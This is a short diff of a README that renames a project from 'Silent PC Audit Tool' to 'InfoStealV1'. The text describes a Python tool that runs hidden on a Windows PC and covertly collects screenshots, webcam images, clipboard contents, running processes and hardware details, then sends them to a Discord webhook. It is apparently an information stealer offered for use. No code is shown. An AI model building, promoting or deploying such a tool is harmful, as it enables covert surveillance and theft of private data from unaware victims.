@@ -1,4 +1,4 @@
-# 🖥️ Silent PC Audit Tool
+# 🖥️ InfoStealV1
 
 This Python-based tool silently collects detailed system information from a Windows PC and sends it to a specified Discord webhook. It runs in stealth mode (no visible console) and includes screenshot capture, webcam image (if available), clipboard data, running processes, and connected hardware details.
 
